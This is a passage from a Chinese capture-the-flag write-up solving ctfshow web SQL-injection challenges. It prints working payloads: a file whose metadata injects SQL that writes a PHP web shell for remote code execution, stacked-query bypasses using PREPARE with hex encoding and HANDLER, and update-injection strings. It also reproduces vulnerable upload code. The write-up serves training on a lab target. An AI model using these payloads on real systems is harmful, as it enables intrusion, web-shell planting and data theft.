src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664305483701-b5cdfb4a-f305-4f61-b37e-153a374ae160.png#averageHue=%23eacf9e&clientId=u41cadc8f-314e-4&from=paste&height=133&id=u911539d9&name=image.png&originHeight=166&originWidth=927&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13472&status=done&style=none&taskId=u336b2878-0581-4089-bdc9-713877071ab&title=&width=741.6" alt="image.png"><br>来到了一个文件上传的地方，到这里我也很疑惑，在这儿，你会发现你上传什么图片文件都无法上传成功，不是文件过大就是返回类型错误，然后我随便上传了一个别的类型的文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664305782009-de7cba34-9df0-4171-8c74-a6e297849862.png#averageHue=%23f3f1f0&clientId=u41cadc8f-314e-4&from=paste&height=75&id=ud89fbe98&name=image.png&originHeight=94&originWidth=293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3283&status=done&style=none&taskId=u956f4c92-79eb-4871-8012-bb963810781&title=&width=234.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664305788024-41679331-c263-41f5-8c3f-299fb63180ae.png#averageHue=%23faf9f9&clientId=u41cadc8f-314e-4&from=paste&height=123&id=uc0bef90e&name=image.png&originHeight=154&originWidth=1090&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17570&status=done&style=none&taskId=ufe8b85a8-a4b9-46c2-bb56-49b691109d0&title=&width=872" alt="image.png"><br>发现已经成功上传，并且名字也被重新命名了，这里一共有两个值filename和filetype其中filetype是不会被重写的<br>猜测这里存在注入点，使用了finfo函数去读取文件：</p>
<ul>
<li>finfo类：finfo是一个类，里面有方法open,file</li>
<li>finfo_open：也就是finfo::open的别名，这个函数的作用是打开一个文件，通常和finfo::file(finfo_file)在一起使用,</li>
<li>finfo_file:返回一个文件的信息<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.finfo-file.php">https://www.php.net/manual/zh/function.finfo-file.php</a></li>
</ul>
<p>大致用法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>((<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;2.png&#x27;</span>));</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">finfo_open</span>(FILEINFO_NONE);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$file</span>,<span class="string">&#x27;2.png&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664305996175-a76f3b34-af93-45cd-a88b-c858a4b8283e.png#averageHue=%23fbf6f6&clientId=u41cadc8f-314e-4&from=paste&height=114&id=u969599da&name=image.png&originHeight=143&originWidth=1619&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12201&status=done&style=none&taskId=u28f1381d-c341-4bcf-b893-0227ea7b787&title=&width=1295.2" alt="image.png"><br>可以看到上下两个语句的效果是等效的，finfo_open必须和finfo_file一起使用，或者用(new finfo）的方法去访问，new finfo实际上作用等效于finfo_open，看得到返回的内容是文件的一系列信息<br>利用这一点构造一个payload文件：（记事本打开）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C64File &quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+                                     沁s寂dA?q?y黃抾|&#123;9l惒1%╓m鯧幆v9?3#;mv诬磇S鏛5Dv镓Qj堜匒C?煕?乼ニo妻鷷?7n积寒遝e跞HO疜鸹M=鳁^鴀亍o钏fH?5fmUe羰獞Q&lt;黁dS溄＄??喙瑙枴溓?&#123;3Uo堊%?k?t饜〖.鲽|a?s?齁韱y;啑鼞?)yχ0]釵C燁L??H歩P?;F!?O??*_铧J漅	Q4IQ糅酰仩Q澮Q4刷X秞燘硢枹竐蕱4猄!?Y_癵G€</span><br><span class="line">-帰E娾?Zg4猄!奦Y瘷歯€</span><br><span class="line">?帰U娾?gl%hT?Bm?枱_?ㄐ︶(冥(?1vA???#媌??F肣寫?c#A?チQ尣(??R鑭?ｈ`?泞[痢嶊擣?&#x27;媌Z@?燘N肣浃(辎F?hT?ByY譯U€</span><br><span class="line">y</span><br><span class="line">G憲淰滲楔Ni?</span><br><span class="line">??鸈≒衟鞭M狸5??Ey飂?S-≒媒胼d?侳i猖瘔畂萺淓d齙嬥?v膽~?8~鷙?6駨幆F脍??&#125;?狊橦W?F8rQ?晴?lt⑥l涌込?珤豉cu?|??&#125;0暹胙齑鈝?m?鞿]&#125;睨骃闦v澌U殠鮵驥熶鷘?v(Q鍌迲I(q??(O∵鶱邖欕鯱琀NX&#125;?氕?S鐔m諫_緌踌ü獬炉謉O貔(Ｓ遞棚矶蛧餠</span><br><span class="line">GF蟧ホ魾?j0襪瀝xCau僇疓E$4顖同(T厷$∷n艶*</span><br><span class="line">圮篘a瘸?斠58犊/醡&quot;?&quot;z4聝(簸畊sC3n髎#懏蹲</span><br><span class="line">巌麀$?攧琳Cp韔Od嶙_羗~n8??y</span><br><span class="line">盇曣 (刏^蹼+?▲??Bv偁L 增&quot;L偶j	jU漫攭*??働&gt;鏝?o棟挔* (3#?_?Bm烧賟+B-^殩AY→?AYAo??R|繠檬?B貮ㄟG賟+B5]HM厾l孭5~T5	悴&quot;詘?=*F*嵙牰w啝8#HU県?穊骊睻U⑶Z?拟@瑋咖D淲违JX慍??F?|e揈湑&#123;&#x27;KX藪摽 睌飖w 矩]X.+b吙b)哽頧羃A,鴍?蛶[k闽&gt;=@,寤???_钯?旄扁$?睌oww@巨??q?UJX??b)唢頧?b??;nE,蠊 栻</span><br><span class="line">飵鮦7锯x謳[玭謮,K鶐w荍 膫/yn?砀盕敭?b鞭驈v砆鴸咻埑返^玛~&#125;鰃`:蕑??膫o壠F軍X;蚬 ??c练黖F軍Xo?腞惧#P*唘4膔k踷Ⅺじ^,v巐╫/z.骔#c#k詴徲&#123;簐潭C棧?臜澆鱘X€盠J瞢碷l??谨*?崌g&amp;虓k??谨???3Ot?N记2唵:馊茌7k貊;猡$u?7俾衊KI&#125;]?魋b繆??a?L篃?a&amp;I榬OLK绿?寰殩刌$a式9-	矹聰鹻Zf搫)??,FgT?xT€肍?z暁拞蜁Q?5%</span><br><span class="line">盯铏jJ6丏褀諗4l,嚔w?i貫EWS野??拨)&#125;hMI弥4(z贇拞?P裘?嵡?姙害?E_^S野l劉矾&gt;i剷(7绥?曉籿d&#123;鹦?纟f污韴C蚸p6寚?Z7?反&#123;牯裠冇a铥銥楮R3n檞涕?外???E痌</span><br><span class="line">N敿G?N锝(p8藑o?葶痌蕉s阤蓒,惠艮觾鉠&lt;&lt;嶑迺7qK粭M锝甩浣?C[陟蕞拮郥嶌N?zm_萅蓒艮?N暪?&#123;③?V糈ダX蓒,惶艮+xx跺糸脥弗軨轇p溗&#125;??]裐ё\杫嚇辿恿?临V拊圼邶_z飴 腔荀r=颜勄塣[?&#x27;y廵w椶&#123;Fp躃€&#x27;厭烖?反&#123;肤揠</span><br><span class="line">巤癸脄纲榈?橑Xvf榻?	蘕?p低&gt;鼕右罨襸?淛毼啂l?螽*谨J纐0h鷄^撰弗?^!8&amp;(4E#珙嬎2飯襸oIO&amp;淖z荛颠擿蓿仫T鯺垾8?戴c-?絯8?_愇剃=鍴xc?蝃?蔟坻坜霌S3柪擎絧pLP?V蕉~?蓒?ы闃k</span><br><span class="line">f7癛郱@既誾?]圇鰟芖甲 c)??$掂V艮?乏€t痰??,(钢xm?戨蛣	掲B?憓&#x27;審蛖臽)(?&lt;?发鱲∽@:鎆脜?XP</span><br><span class="line">p瓚?蒠M?y镳耍?|l匏+5A敝H??发鼬Z=8$ 0?顦閌RL?搾潣c?叹?儍PI?fX箼崇?茐x?&#x27;an趞騷?&#123;v谴€暃I1M趸饽sY笊?! &amp;C氷廀3皰3)鎯#倊賯[肠鳘r髱|P?衇?J罂V&#x27;?5yqT鱽?v+K帺鞠?Oq羏*(騎鮅#DQV朶W&#125;R	Q钠G(騟鮅#DQV枩[&#125;R	Q?e(騰鮅#DQV栜_&#125;R	Q膯??鮅#DQV?DKRM?湶?殥*</span><br><span class="line">(K-?Ge苍S殥**b┥4%U耪=o攢RU蠩俆ye?$&#x27;敧?U灳滨gA┆O?R?铕厒敧??U?绝q翤PA俆y对渨?敧醠?蠔f觉磶蔺r5K眨p廟濖?騤謝枾NA=?</span><br><span class="line">?壣a锺锺锺镅犍摵? x  </span><br></pre></td></tr></table></figure>
<p>可以看到文件被插入了一个脏语句，<code>0x3c3f3d60245f4745545b315d603f3e</code>是<?=`$_GET[1]`?>的十六进制字符串，本地读取一下看看是什么样子的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664306408083-89c08bd1-4be7-49a8-8a54-564f3c6803d1.png#averageHue=%23f3e4c6&clientId=u41cadc8f-314e-4&from=paste&height=121&id=ua9ecb50f&name=image.png&originHeight=151&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20915&status=done&style=none&taskId=ud52e8e28-03a4-4899-bb7d-b9b9f3e959b&title=&width=1536" alt="image.png"><br>看的到脏字符已经插入了，网站源代码的插叙语句很可能是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以上传payload.bin文件，之后访问1.php你就会发现可以RCE了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664306502442-e07f945d-66e5-4658-adf7-dbe97bcacbad.png#averageHue=%23f0dca7&clientId=u41cadc8f-314e-4&from=paste&height=105&id=u87cab933&name=image.png&originHeight=131&originWidth=1379&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14781&status=done&style=none&taskId=ue1142fc1-721a-42fd-a8d5-09d1622bcdf&title=&width=1103.2" alt="image.png"><br>之后一步步读flag即可</p>
<p>TIPS：把upload.php拷贝了下来：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]&gt;<span class="number">10</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;文件过大: &quot;</span> .(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">	  <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">      <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">	  <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filepath</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filetype</span>.<span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	  <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">		<span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">		</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到此处存在注入点，和上面分析是一样的<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664306571141-4ee30913-eea4-4cf8-8091-2c8cd9b01bc7.png#averageHue=%23eaeaea&clientId=u41cadc8f-314e-4&from=paste&height=106&id=u6e608f3c&name=image.png&originHeight=132&originWidth=1023&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8532&status=done&style=none&taskId=u6fcc90ca-ba96-4b7f-b9c3-0c5717ec458&title=&width=818.4" alt="image.png"></p>
<h2 id="Web225-堆叠进阶）"><a href="#Web225-堆叠进阶）" class="headerlink" title="Web225(堆叠进阶）"></a>Web225(堆叠进阶）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664372912250-64547160-325c-4272-b4f8-8d95d088e13e.png#averageHue=%23f6f6f6&clientId=u3d3635ce-0e42-4&from=paste&height=611&id=u18a69d37&name=image.png&originHeight=764&originWidth=1526&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32948&status=done&style=none&taskId=u535dd0d6-be81-43ba-9498-412f3d1e192&title=&width=1220.8" alt="image.png"><br>在搜索栏内不管你搜什么都是没有结果的，抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664373154871-ec3b5b0b-f446-4e31-8e4b-861e80d0aca9.png#averageHue=%23f6f6f5&clientId=u53de6700-9c1f-4&from=paste&height=230&id=u070f0dc6&name=image.png&originHeight=288&originWidth=1145&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40077&status=done&style=none&taskId=ub6d0ab6d-443b-4206-aca6-4bc6f84f195&title=&width=916" alt="image.png"><br>在这里输入上面的payload后：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664373185111-c9cacae1-322c-4d02-872a-2b3815e011f4.png#averageHue=%23f6f6f5&clientId=u53de6700-9c1f-4&from=paste&height=177&id=ub00a1f8b&name=image.png&originHeight=221&originWidth=1544&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37357&status=done&style=none&taskId=ub364cd96-ca89-43cd-918b-b1ab1a753d5&title=&width=1235.2" alt="image.png"><br>得到了表名<code>ctfshow_flagasa</code>，之后再读取一下列名，用<code>1&#39;;show columns from ctfshow_flagasa;#(url编码）</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664373323442-ecb5902b-632c-4727-ae96-07fc0ae0fbef.png#averageHue=%23f5f4f4&clientId=u53de6700-9c1f-4&from=paste&height=222&id=ub51bdec4&name=image.png&originHeight=278&originWidth=1531&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49265&status=done&style=none&taskId=u59f9a0a2-fbaa-4c68-8f5c-2faf9ab2f93&title=&width=1224.8" alt="image.png"><br>得到了flag的字段名<code>flagas</code>,接下来有两种解法：</p>
<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用预处理去解决：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664374648487-a311bf9b-155d-4da6-abbd-c9882fa0ca8a.png#averageHue=%23f1f0f0&clientId=u53de6700-9c1f-4&from=paste&height=781&id=u28f35574&name=image.png&originHeight=976&originWidth=1294&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86607&status=done&style=none&taskId=ue13eedb5-6f5a-4c58-b81e-cd212e4e3aa&title=&width=1035.2" alt="image.png"><br>payload：<code>username=1&#39;;PREPARE boogipop from concat(&#39;s&#39;,&#39;elect&#39;, &#39; database()&#39;);EXECUTE boogipop#;</code><br>或者是<code>username=1&#39;;PREPARE boogipop from concat(char(115,101,108,101,99,116),&#39; database()&#39;);EXECUTE boogipop;#</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664375141453-6fc12fc3-2582-4178-8ce2-6da7ac2ac412.png#averageHue=%23f6f6f6&clientId=u53de6700-9c1f-4&from=paste&height=286&id=u04f774b5&name=image.png&originHeight=357&originWidth=1075&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40427&status=done&style=none&taskId=uaee7d3e9-fc83-4b06-9e6c-1d323928551&title=&width=860" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664374794300-d2f468e0-cbbe-4b4d-aa0d-7b2becf4deea.png#averageHue=%23f8f7f7&clientId=u53de6700-9c1f-4&from=paste&height=298&id=ua5735edf&name=image.png&originHeight=373&originWidth=1418&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50644&status=done&style=none&taskId=ub2751471-38a8-4307-9440-0fcea95ee63&title=&width=1134.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664374933527-7ce06c57-f592-4700-be4c-f5bc50660ed5.png#averageHue=%23f8f6f6&clientId=u53de6700-9c1f-4&from=paste&height=262&id=uc53edbba&name=image.png&originHeight=327&originWidth=1375&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45808&status=done&style=none&taskId=uf1a810e2-2017-423f-9d82-031e799f42e&title=&width=1100" alt="image.png"><br>之后一步步的去改指令爆库爆字段即可</p>
<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用Handler指令：@<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664375175939-31bbd8a7-edd7-4a41-bb54-094cbe6a1158.png#averageHue=%23f9f8f7&clientId=u53de6700-9c1f-4&from=paste&height=557&id=uf3a58d47&name=image.png&originHeight=696&originWidth=1303&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138372&status=done&style=none&taskId=ue30212bd-b0a9-474d-91c5-69fedbb6b01&title=&width=1042.4" alt="image.png"><br>payload：<br>先用show tables和show columns得出字段，再：<br><code>username=1&#39;;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code></p>
<h2 id="Web226（十六进制-预处理）"><a href="#Web226（十六进制-预处理）" class="headerlink" title="Web226（十六进制+预处理）"></a>Web226（十六进制+预处理）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664376546136-74af4f1d-5eaf-4153-85fc-2cef51c0230d.png#averageHue=%23f4f4f4&clientId=ua947e0ad-101e-4&from=paste&height=358&id=u56ec3e24&name=image.png&originHeight=448&originWidth=1436&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20957&status=done&style=none&taskId=u1fd0a51a-267b-4a20-8ab8-740fbc6118a&title=&width=1148.8" alt="image.png"><br>把括号ban了，show也没了，那show tables是用不了了，这里有个比较骚的方法，可以用PREPARE预处理和十六进制结合：<br>比如PREPARE boogipop from ‘show tables’;EXECUTE boogipop;<br>可以把<code>show tables</code>十六进制编码后再放入，这样就可以绕过了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664376761705-72799f25-32fc-4cb6-a128-26d6e3c55ab5.png#averageHue=%23cbcbcb&clientId=ua947e0ad-101e-4&from=paste&height=653&id=u28e752af&name=image.png&originHeight=816&originWidth=1781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63891&status=done&style=none&taskId=u775f3755-68f5-4c13-a848-11734d6b192&title=&width=1424.8" alt="image.png"><br>然后就是读字段，读到为<code>flagasb</code>，然后这里有两种方法，和上面一样</p>
<ul>
<li>用handler：</li>
</ul>
<p><code>?username=1&#39;;handler ctfsh_ow_flagas open;handler ctfsh_ow_flagas read first;</code></p>
<ul>
<li>继续用十六进制+PREPARE：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664376923939-e6c7e41a-5c37-44fe-8ba2-8540c39abcc4.png#averageHue=%23c4c3c3&clientId=ua947e0ad-101e-4&from=paste&height=665&id=u445135a9&name=image.png&originHeight=831&originWidth=1379&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60540&status=done&style=none&taskId=u7f7528d0-d06f-4321-bcd4-29b6aef814a&title=&width=1103.2" alt="image.png"></p>
<h2 id="Web227-查看存储过程和函数）"><a href="#Web227-查看存储过程和函数）" class="headerlink" title="Web227(查看存储过程和函数）"></a>Web227(查看存储过程和函数）</h2><p>参考文章：<br>information_schema  数据库中的  Routines  表中，存储了所有存储过程和函数的定义。使用 SELECT 语句查询  Routines 表中的存储过程和函数的定义时，一定要使用 ROUTNE_NAME  字段指定存储过程或函数的名称。否则，将查询出所有的存储过程或函数的定义。如果存储过程和存储函数名称相同，则需要要同时指定  ROUTINE_TYPE  字段表明查询的是哪种类型的存储程序。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">
</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664378719482-85812d34-61ee-4639-94f6-652d595a41c5.png#averageHue=%23f5f5f5&clientId=ua947e0ad-101e-4&from=paste&height=341&id=uee111f4e&name=image.png&originHeight=426&originWidth=1488&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18474&status=done&style=none&taskId=u090f8075-181c-480f-91a9-28bc628d5a8&title=&width=1190.4" alt="image.png"><br>ban的东西没差，你用上一题的方法也可以成功，但是你会发现，你找遍了数据库也找不到flag到底在哪儿，这里就要用到数据存储查询了<br>payload<code>?username=1%27;prepare%20boogipop%20from%200x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute%20boogipop;#</code><br>十六进制编码是：select * from information_schema.routines<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664378801501-3a48654c-3d84-4bdc-bb65-812920a36b9b.png#averageHue=%23efece9&clientId=ua947e0ad-101e-4&from=paste&height=454&id=uffa2584c&name=image.png&originHeight=567&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=130216&status=done&style=none&taskId=u6801d0e5-b860-459b-831c-9e1fd1f0a7b&title=&width=1536" alt="image.png"><br>可以看到flag</p>
<h2 id="Web228-Web230"><a href="#Web228-Web230" class="headerlink" title="Web228-Web230"></a>Web228-Web230</h2><p>全部都是Web226的套路</p>
<h2 id="Web231-update注入开始）"><a href="#Web231-update注入开始）" class="headerlink" title="Web231(update注入开始）"></a>Web231(update注入开始）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664428255727-0688edc5-f6e0-4f17-a14c-9a2891927e7c.png#averageHue=%23f6f6f6&clientId=u92538bd6-8517-4&from=paste&height=472&id=u93bbcc59&name=image.png&originHeight=590&originWidth=1534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18776&status=done&style=none&taskId=u9fa48b29-ece2-479b-9364-a6849728bb4&title=&width=1227.2" alt="image.png"><br>就给了个这个，其他啥也没给，查询框也没有，猜测传参点还是上面的&#x2F;api&#x2F;下，然后参数是passowrd和username<br>这里注入点就在<code>password</code>上了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664428361636-bfa4c539-c9f8-43b3-8ba9-1c1935f9085e.png#averageHue=%23888888&clientId=u92538bd6-8517-4&from=paste&height=538&id=ubaf4ffc3&name=image.png&originHeight=672&originWidth=1199&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46596&status=done&style=none&taskId=u5a6afe33-35b2-4abe-82ac-f53e4807a0d&title=&width=959.2" alt="image.png"><br>显示更新成功<br>这样payload的话查询语句相当于<code>update ctfshow_user set pass = &#39;1&#39;,username=&#39;a&#39;#&#39; where username = &#39;1&#39;</code>:<br>后面的话被注释了，我们把所有字段的username全部改为了a，回到主页面可以发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664428453374-b482a1ff-40e6-4f4b-b92b-e4b49bece0d9.png#averageHue=%23fcfcfc&clientId=u92538bd6-8517-4&from=paste&height=487&id=u28c1b272&name=image.png&originHeight=609&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16546&status=done&style=none&taskId=udbf0a0ec-ebc0-4097-9b32-c1f94557b46&title=&width=1280" alt="image.png"><br>用户名全都是a，然后密码都是1，接下来就有和联合注入有点类似了，注入点是password中的username<br>我们payload改为<code>password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1</code><br>再回到页面就可以发现表名被暴露出了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664428539590-65ecc1f4-f82b-403f-af51-e2ae55c0d764.png#averageHue=%23fbfbfb&clientId=u92538bd6-8517-4&from=paste&height=418&id=u106ab4a8&name=image.png&originHeight=522&originWidth=1502&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44302&status=done&style=none&taskId=u8d843eff-c5a3-42da-bc9f-726f990f6bc&title=&width=1201.6" 